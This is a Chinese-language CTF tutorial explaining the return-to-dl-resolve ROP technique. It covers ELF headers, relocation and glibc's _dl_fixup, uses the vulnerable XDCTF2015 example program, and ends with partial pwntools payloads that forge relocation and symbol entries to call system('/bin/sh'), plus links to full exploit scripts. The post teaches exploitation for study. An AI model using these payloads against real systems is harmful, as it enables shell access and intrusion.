---
title: rop - return to dl-resolve
categories:
  - pwn
tags: rop
published: true
---

# Introduction 

return to dl_runtime_resolve 是 rop 中的一种技巧，适用于程序libc库未知的情况下，利用 dl_runtime_resolve 函数
查找 system 函数的地址，要明白这个技巧的使用方法必须先明白 elf 文件的结构。

## Elf File Format

elf 文件格式相关的定义可以在 `glibc-xxx/elf/elf.h` 文件中查看，这里以一个简单的程序为例：

```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln()
{
    char buf[100];

    setbuf(stdin, buf);
    read(0, buf, 256);
}

int main()
{
    char buf[100] = "Welcome to XDCTF2015~!\n";

    setbuf(stdout, buf);
    write(1, buf, strlen(buf));
    vuln();

    return 0;
}
```

从32位的程序开始，运行 `gcc -fno-stack-protector -m32 stack_overflow.c -o stack_overflow32` 编译生成32位的
可执行文件，并且关闭 stack canary。

elf 格式可用于可执行文件、共享库、目标文件、coredump文件，甚至内核引导镜像文件。

### elf file header

使用 `readelf -h` 命令查看 elf 文件，可以看到原始的 elf 文件头，文件头主要标记了 elf 类型、结构和程序入口地址
。通过查看 linux ELF (5) 手册可以了解 elf 头部的结构，也可查看 elf.h 文件。

```c
typedef struct
{
  unsigned char	e_ident[EI_NIDENT];	/* Magic number and other info */
  Elf32_Half	e_type;			/* Object file type */
  Elf32_Half	e_machine;		/* Architecture */
  Elf32_Word	e_version;		/* Object file version */
  Elf32_Addr	e_entry;		/* Entry point virtual address */
  Elf32_Off	e_phoff;		/* Program header table file offset */
  Elf32_Off	e_shoff;		/* Section header table file offset */
  Elf32_Word	e_flags;		/* Processor-specific flags */
  Elf32_Half	e_ehsize;		/* ELF header size in bytes */
  Elf32_Half	e_phentsize;		/* Program header table entry size */
  Elf32_Half	e_phnum;		/* Program header table entry count */
  Elf32_Half	e_shentsize;		/* Section header table entry size */
  Elf32_Half	e_shnum;		/* Section header table entry count */
  Elf32_Half	e_shstrndx;		/* Section header string table index */
} Elf32_Ehdr;


$ readelf -h ./stack_overflow32 
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x80483f0
  Start of program headers:          52 (bytes into file)
  Start of section headers:          6316 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         9
  Size of section headers:           40 (bytes)
  Number of section headers:         31
  Section header string table index: 28
```

### program segment header

elf 程序头是对二进制文件中段的描述，段 (segment) 描述了可执行文件的内存布局以及如何映射到内存中。

```c
typedef struct
{
  Elf32_Word	p_type;			/* Segment type */
  Elf32_Off	p_offset;		/* Segment file offset */
  Elf32_Addr	p_vaddr;		/* Segment virtual address */
  Elf32_Addr	p_paddr;		/* Segment physical address */
  Elf32_Word	p_filesz;		/* Segment size in file */
  Elf32_Word	p_memsz;		/* Segment size in memory */
  Elf32_Word	p_flags;		/* Segment flags */
  Elf32_Word	p_align;		/* Segment alignment */
} Elf32_Phdr;


$ readelf -l ./stack_overflow32 

Elf file type is EXEC (Executable file)
Entry point 0x80483f0
There are 9 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x00768 0x00768 R E 0x1000
  LOAD           0x000f08 0x08049f08 0x08049f08 0x00120 0x00144 RW  0x1000
  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x000640 0x08048640 0x08048640 0x00034 0x00034 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 
   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
   04     .dynamic 
   05     .note.ABI-tag .note.gnu.build-id 
   06     .eh_frame_hdr 
   07     
   08     .init_array .fini_array .jcr .dynamic .got 
```

一个可执行文件至少有一个 PT_LOAD 类型的段，这类程序头描述的是可装载的段，会被装载或者映射到内存中，例如存放
程序代码的 text 段、存放全局变量和动态链接信息的 data 段。

dynamic 动态段是动态链接可执行文件所特有的，包含了动态链接器所必需的一些信息，如运行时需要链接的共享库列表、
全局偏移表的地址、重定位条目的相关信息。

32位 elf 文件的动态段结构体如下：

```c
typedef struct
{
  Elf32_Sword	d_tag;			/* Dynamic entry type */
  union
    {
      Elf32_Word d_val;			/* Integer value */
      Elf32_Addr d_ptr;			/* Address value */
    } d_un;
} Elf32_Dyn;
```

### elf section header

elf 节 (section) 和 段 (segment) 是不同的，段是程序执行的必要组成部分，在每个段中，会有代码或者数据被划分为不
同的节。节头表是对这些节的位置和大小的描述，主要用于链接和调试。节头对于程序并不是必需的，因为它没有对程序的内
存布局进行描述。

elf section header struct:

```c
typedef struct
{
  Elf32_Word	sh_name;		/* Section name (string tbl index) */
  Elf32_Word	sh_type;		/* Section type */
  Elf32_Word	sh_flags;		/* Section flags */
  Elf32_Addr	sh_addr;		/* Section virtual addr at execution */
  Elf32_Off	sh_offset;		/* Section file offset */
  Elf32_Word	sh_size;		/* Section size in bytes */
  Elf32_Word	sh_link;		/* Link to another section */
  Elf32_Word	sh_info;		/* Additional section information */
  Elf32_Word	sh_addralign;		/* Section alignment */
  Elf32_Word	sh_entsize;		/* Entry size if section holds table */
} Elf32_Shdr;
```

- .text 节是保存了程序代码指令的代码节。

- .rodata 节保存了只读的数据，因为是只读的所以只能在 text 段中找到 .rodata 节。

- .plt 节包含了动态链接器调用从共享库导入的函数所必需的相关代码。

- .data 节存在于 data 段中，保存了初始化的全局变量等数据。

- .bss 节保存了未进行初始化的全局数据。

- .got.plt 节，.got 节保存了全局偏移表，.got.plt 节保存了全局函数偏移表，.got.plt 节是 .got 节的子集。

- .dynsym 节保存了从共享库导入的动态符号信息。

- .dynstr 节保存了动态符号字符串表，表中存放了一系列字符串。

- .rel.* 节，重定位节保存了重定位相关的信息。

- .symtab 节保存了所有符号信息，而 .dynsym节只保存了与动态链接相关的符号，.dynsym 节为 .symtab 节的子集。

- .strtab 节保存了全部的符号字符串表，与 .symtab 节类似，.dynstr 节为 .strtab 节的子集。

- .shstrtab 节保存节头字符串表，保存了每个节的节名。

- .ctors 节和 .dtors 节保存了指向构造函数和析构函数的指针。

```c
$ readelf -S ./stack_overflow32 
There are 31 section headers, starting at offset 0x18ac:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000a0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          08048278 000278 00006b 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          080482e4 0002e4 000014 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         080482f8 0002f8 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048318 000318 000018 08   A  5   0  4
  [10] .rel.plt          REL             08048330 000330 000028 08  AI  5  24  4
  [11] .init             PROGBITS        08048358 000358 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        08048380 000380 000060 04  AX  0   0 16
  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 00  AX  0   0  8
  [14] .text             PROGBITS        080483f0 0003f0 000232 00  AX  0   0 16
  [15] .fini             PROGBITS        08048624 000624 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        08048638 000638 000008 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        08048640 000640 000034 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048674 000674 0000f4 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804a000 001000 000020 04  WA  0   0  4
  [25] .data             PROGBITS        0804a020 001020 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804a040 001028 00000c 00  WA  0   0 32
  [27] .comment          PROGBITS        00000000 001028 000034 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 00179f 00010a 00      0   0  1
  [29] .symtab           SYMTAB          00000000 00105c 0004b0 10     30  47  4
  [30] .strtab           STRTAB          00000000 00150c 000293 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
```

### elf symbol

.dynsym 节是被标记了 A (ALLOC)，表示该节会在运行时分配并装载进入内存，而 .symtab 不是在运行时所必须。

32位 elf 文件符号项结构：

```c
typedef struct
{
  Elf32_Word	st_name;		/* Symbol name (string tbl index) */
  Elf32_Addr	st_value;		/* Symbol value */
  Elf32_Word	st_size;		/* Symbol size */
  unsigned char	st_info;		/* Symbol type and binding */
  unsigned char	st_other;		/* Symbol visibility */
  Elf32_Section	st_shndx;		/* Section index */
} Elf32_Sym;
```

`st_name` 保存了指向符号表中字符串表 (.dynstr 或 .strtab) 的偏移地址，存放着符号的名称，如 system。
`st_info` 指定符号类型及绑定属性。

### elf relocation

重定位条目的数据结构如下：

```c
typedef struct
{
  Elf32_Addr	r_offset;		/* Address */
  Elf32_Word	r_info;			/* Relocation type and symbol index */
} Elf32_Rel;

$ readelf -r ./stack_overflow32 

Relocation section '.rel.dyn' at offset 0x318 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__
0804a040  00000905 R_386_COPY        0804a040   stdin@GLIBC_2.0
0804a044  00000705 R_386_COPY        0804a044   stdout@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x330 contains 5 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
```

`r_offset` 指向需要进行重定位操作的位置，如 got 表。`r_info` 指定必须对其进行重定位的符号表索引以及要应用的重
定位类型。

重定位操作详细描述了如何对存放在 `r_offset` 中的代码或数据进行修改。

我们来观察一下程序是如何进行重定位操作的，当首次调用 `setbuf@plt` 时：

```c
[-------------------------------------code-------------------------------------]
   0x8048574 <main+85>:	lea    edx,[ebp-0x6c]
   0x8048577 <main+88>:	push   edx
   0x8048578 <main+89>:	push   eax
=> 0x8048579 <main+90>:	call   0x8048390 <setbuf@plt>
...

gdb-peda$ si

...
=> 0x8048390 <setbuf@plt>:	jmp    DWORD PTR ds:0x804a00c
 | 0x8048396 <setbuf@plt+6>:	push   0x0
 | 0x804839b <setbuf@plt+11>:	jmp    0x8048380
 | 0x80483a0 <read@plt>:	jmp    DWORD PTR ds:0x804a010
 | 0x80483a6 <read@plt+6>:	push   0x8
 |->   0x8048396 <setbuf@plt+6>:	push   0x0
       0x804839b <setbuf@plt+11>:	jmp    0x8048380
       0x80483a0 <read@plt>:	jmp    DWORD PTR ds:0x804a010
       0x80483a6 <read@plt+6>:	push   0x8
                                                                  JUMP is taken
...
```

.plt 首先跳转到 .got.plt 上 `setbuf` 函数的 `r_offset` 处，而 `setbuf` 函数还未进行绑定，.got.plt 上存放的是
`setbuf@plt+6` 的地址：

```c
gdb-peda$ x/4xw 0x804a000
0x804a000:	0x08049f14	0xf7ffd918	0xf7fee000	0x08048396
```

然后将函数在 .rel.plt 上的偏移压入栈中，跳到 .plt 起始位置处继续执行。

```c
gdb-peda$ x/10i 0x8048380
   0x8048380:	push   DWORD PTR ds:0x804a004
   0x8048386:	jmp    DWORD PTR ds:0x804a008
...
```

.got.plt 节起始位置存放了 .dynamic、link_map、dl_runtime_resolve 的地址，所以接下来将 link_map 压栈后跳到
dl_runtime_resolve 函数处执行 (link_map 的定义在：`glibc-xxx/include/link.h`)。

`_dl_runtime_resolve` 函数在 `glibc-xxx/sysdeps/i386/dl-trampoline.S` 中定义，用汇编实现处理了传参后调用
`_dl_fixup` 函数进行真正的重定位处理： `(glibc-2.23/elf/dl-runtime.c)`

```c
...
#ifndef reloc_offset
# define reloc_offset reloc_arg
# define reloc_index  reloc_arg / sizeof (PLTREL)
#endif

...

_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
	   struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  /* Sanity check that we're really looking at a PLT relocation.  */
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

   /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;

      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
	{
	  const ElfW(Half) *vernum =
	    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
	  version = &l->l_versions[ndx];
	  if (version->hash == 0)
	    version = NULL;
	}
...
```

`_dl_fixup` 函数从 link_map 中找到对应的 symtab 和 strtab，再根据传入的 `reloc_arg` 参数找到需要重定位的
`setbuf` 函数在 .rel.plt 重定位节上对应的条目，再根据重定位条目的 `r_info` 找到 symtab 表中符号字符串在 strtab
表中的偏移，找到 strtab 中的字符串后查找对应的函数地址填写到 `r_offset` 地址处，即完成了函数重定位。

`ELFW(type)` 的宏最终会替换成 `ELF##32/64##_type` (`##` 为字符串连接符)，如 `ELFW(R_SYM)` 被替换成 `ELF32_R_SYM`
，其相关宏定义在 `glibc-xxx/elf/elf.h` 中：

```c
...
#define ELF32_R_SYM(val)		((val) >> 8)
#define ELF32_R_TYPE(val)		((val) & 0xff)
#define ELF32_R_INFO(sym, type)		(((sym) << 8) + ((type) & 0xff))
...
```

# Return to dl-runtime-resolve

在了解了 ELF 文件格式后，我们可以实施以下攻击思路：

- 控制 eip 为 `.plt` 地址，传递 `reloc_arg` 参数
- 控制 `reloc_arg` 的值，使 `reloc` 落在可控范围内
- 伪造 `reloc` 的内容，使 `sym` 落在可控范围内
- 伪造 `sym` 的内容，使 `name` 落在可控范围内
- 伪造 `name` 为 system

构造 rop chain 放置好构造的数据：

{% highlight python %}
```python
dynsym_addr = 0x80481d8
dynstr_addr = 0x8048278
rel_plt_addr = 0x8048330
dynamic_addr = 0x8048f14

# fake

base_addr = bss_addr+0x20
reloc_arg = base_addr-rel_plt_addr
dynsym_off = ((base_addr+0x8-dynsym_addr)/0x10) << 0x8| 0x7
system_off = base_addr+0x18-dynstr_addr
bin_sh_addr = base_addr+0x20

payload = p8(0)*0x70
payload += p32(read_plt)
payload += p32(pppop_ret)
payload += p32(0)
payload += p32(base_addr)
payload += p32(0x28)
payload += p32(plt_addr)    # jump to dl_runtime_resolve
payload += p32(reloc_arg)   # reloc_arg
payload += p32(read_plt)
payload += p32(0)
payload += p32(bin_sh_addr)
payload += p8(0)*(0x100-len(payload))
...
```
{% endhighlight %}

然后调用 `.plt` 起始位置处的代码使用伪造的参数执行 dl_runtime_resolve 查找 system 函数地址放置在 `.got.plt`
上任意函数处，最后调用该函数的 plt 执行 system。

伪造数据：

{% highlight python %}
...
payload = p32(read_got)
payload += p32(dynsym_off)
payload += p32(system_off)
payload += p32(0)*0x2
payload += p32(0x12)
payload += "system\x00\x00"
payload += "/bin/sh\x00"
{% endhighlight %}

完整 exp 在 [exp32.py](https://github.com/0x3f97/pwn/blob/master/ret2dl-resolve/exp32.py)

64位下的 dl-runtime-resolve 与 32位的不同，一个是 `reloc_arg` 由偏移量变为 index 值，查看 `.plt` 代码：

```c
   0x400510:	push   QWORD PTR [rip+0x200af2]        # 0x601008
   0x400516:	jmp    QWORD PTR [rip+0x200af4]        # 0x601010
...

=> 0x400540 <setbuf@plt>:	jmp    QWORD PTR [rip+0x200ae2]        # 0x601028
 | 0x400546 <setbuf@plt+6>:	push   0x2
 | 0x40054b <setbuf@plt+11>:	jmp    0x400510

```

另外由于偏移变为 index 值，以下代码因为无效内存地址而出错：

```c
 if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
	{
	  const ElfW(Half) *vernum =
	    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
	  version = &l->l_versions[ndx];
	  if (version->hash == 0)
	    version = NULL;
	}
```

解决办法则是将 `l->l_info[VERSYMID (DT_VERSYM)]` 的值给些为 `NULL`，而该值位于 link_map 偏移 `0x1c8` 处。
exp: [exp64.py](https://github.com/0x3f97/pwn/blob/master/ret2dl-resolve/exp64.py)


# Reference

- [The advanced return-into-lib(c) exploits](http://phrack.org/issues/58/4.html)

- [Return-to-dl-resolve](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/) 深入浅出

- [Try ASLR + DEP avoidance with ROP stager + Return-to-dl-resolve on x64](http://inaz2.hatenablog.com/entry/2014/07/27/205322)

- [ROP之return to dl-resolve](http://rk700.github.io/2015/08/09/return-to-dl-resolve/)

- [在64位系统中使用ROP+Return-to-dl-resolve来绕过ASLR+DEP](http://www.freebuf.com/articles/system/149364.html)

- [Return to dl-resolve](http://blog.angelboy.tw/)
